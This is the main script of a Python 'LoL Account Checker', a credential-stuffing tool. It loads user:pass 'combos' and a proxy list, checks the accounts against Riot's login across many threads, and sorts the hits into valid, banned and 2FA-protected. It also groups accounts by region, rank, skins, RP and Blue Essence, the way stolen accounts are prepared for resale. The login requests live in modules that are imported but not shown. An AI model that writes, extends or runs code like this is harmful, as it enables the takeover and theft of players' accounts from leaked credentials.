"""
LoL Account Checker - Main entry point.

Usage:
    python main.py -c combos.txt -p proxies.txt -t 10
"""

from __future__ import annotations

import argparse
import sys
import time
import urllib3

from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.table import Table
from rich.text import Text

from checker import CheckerStats, load_combos, run_checker
from config import DEFAULT_THREADS, DEFAULT_TIMEOUT
from formatter import save_results
from models import AccountResult
from proxy_manager import ProxyManager

# Suppress insecure request warnings (self-signed cert in Riot auth)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()


BANNER = r"""
  _       ___   _          ____ _   _ _____ ____ _  _______ ____
 | |     / _ \ | |        / ___| | | | ____/ ___| |/ / ____|  _ \
 | |    | | | || |       | |   | |_| |  _|| |   | ' /|  _| | |_) |
 | |___ | |_| || |___    | |___|  _  | |__| |___| . \| |___|  _ <
 |_____| \___/ |_____|    \____|_| |_|_____\____|_|\_\_____|_| \_\
"""


def build_status_table(stats: CheckerStats, recent: list[str]) -> Table:
    """Build a live-updating status table."""
    table = Table(title="Checker Status", expand=True, border_style="blue")
    table.add_column("Metric", style="cyan", width=15)
    table.add_column("Value", style="white", width=12)
    table.add_column("Recent Hits", style="green", ratio=1)

    progress = f"{stats.checked}/{stats.total}"
    pct = (stats.checked / stats.total * 100) if stats.total else 0

    recent_text = "\n".join(recent[-8:]) if recent else "Waiting..."

    table.add_row("Progress", f"{progress} ({pct:.1f}%)", recent_text)
    table.add_row("Valid", f"[green]{stats.valid}[/]", "")
    table.add_row("Invalid", f"[red]{stats.invalid}[/]", "")
    table.add_row("Banned", f"[yellow]{stats.banned}[/]", "")
    table.add_row("2FA", f"[magenta]{stats.twofa}[/]", "")
    table.add_row("Errors", f"[red]{stats.errors}[/]", "")

    return table


def main():
    parser = argparse.ArgumentParser(
        description="LoL Account Checker",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "-c", "--combos", required=True, help="Path to combos file (user:pass)"
    )
    parser.add_argument(
        "-p", "--proxies", default=None, help="Path to proxy list file"
    )
    parser.add_argument(
        "-t", "--threads", type=int, default=DEFAULT_THREADS, help="Thread count"
    )
    parser.add_argument(
        "--timeout", type=int, default=DEFAULT_TIMEOUT, help="Request timeout (secs)"
    )
    parser.add_argument(
        "-o", "--output", default="results", help="Output directory"
    )

    args = parser.parse_args()

    console.print(Text(BANNER, style="bold cyan"))
    console.print()

    # Load combos
    try:
        combos = load_combos(args.combos)
    except FileNotFoundError:
        console.print(f"[red]Combo file not found: {args.combos}[/]")
        sys.exit(1)

    if not combos:
        console.print("[red]No valid combos found in file.[/]")
        sys.exit(1)

    console.print(f"[cyan]Loaded {len(combos)} combos[/]")

    # Load proxies
    proxy_manager = None
    if args.proxies:
        proxy_manager = ProxyManager(args.proxies)
        if proxy_manager.count == 0:
            console.print("[yellow]Warning: No proxies loaded, running proxyless.[/]")
            proxy_manager = None
        else:
            console.print(f"[cyan]Loaded {proxy_manager.count} proxies[/]")

    console.print(f"[cyan]Threads: {args.threads} | Timeout: {args.timeout}s[/]")
    console.print()

    # Recent hits list (shared state for display)
    recent_hits: list[str] = []

    start_time = time.time()

    def on_result(result: AccountResult, stats: CheckerStats):
        if result.status == "VALID":
            recent_hits.append(result.summary_line())

    # Run checker with live display
    with Live(
        build_status_table(CheckerStats(len(combos)), []),
        console=console,
        refresh_per_second=4,
    ) as live:
        # We need a wrapper to update the live display
        _stats_ref: list[CheckerStats | None] = [None]

        def on_result_live(result: AccountResult, stats: CheckerStats):
            _stats_ref[0] = stats
            on_result(result, stats)
            live.update(build_status_table(stats, recent_hits))

        results = run_checker(
            combos,
            proxy_manager=proxy_manager,
            threads=args.threads,
            timeout=args.timeout,
            callback=on_result_live,
        )

    elapsed = time.time() - start_time

    # Save results
    output_path = save_results(results, args.output)

    # Summary
    valid_count = sum(1 for r in results if r.status == "VALID")
    invalid_count = sum(1 for r in results if r.status == "INVALID")
    banned_count = sum(1 for r in results if r.status == "BANNED")
    error_count = sum(
        1 for r in results if r.status in ("ERROR", "RATE_LIMITED")
    )

    console.print()
    console.print(
        Panel(
            f"[green]Valid: {valid_count}[/] | "
            f"[red]Invalid: {invalid_count}[/] | "
            f"[yellow]Banned: {banned_count}[/] | "
            f"[red]Errors: {error_count}[/]\n"
            f"Time: {elapsed:.1f}s | "
            f"Speed: {len(results) / elapsed:.1f} checks/s\n"
            f"Results saved to: [cyan]{output_path}[/]",
            title="Check Complete",
            border_style="green",
        )
    )

    console.print()
    console.print("[cyan]Result files structure:[/]")
    console.print(f"  {output_path}/")
    console.print("    valid.txt          - All valid accounts")
    console.print("    invalid.txt        - Invalid credentials")
    console.print("    banned.txt         - Banned accounts")
    console.print("    errors.txt         - Errors & rate limits")
    console.print("    2fa.txt            - 2FA-protected accounts")
    console.print("    full_report.txt    - Detailed report")
    console.print("    by_region/         - Grouped by server")
    console.print("    by_rank/           - Grouped by rank tier")
    console.print("    by_level/          - Grouped by level range")
    console.print("    by_skins/          - Grouped by skin count")
    console.print("    by_rp/             - Grouped by RP amount")
    console.print("    by_blue_essence/   - Grouped by BE amount")


if __name__ == "__main__":
    main()
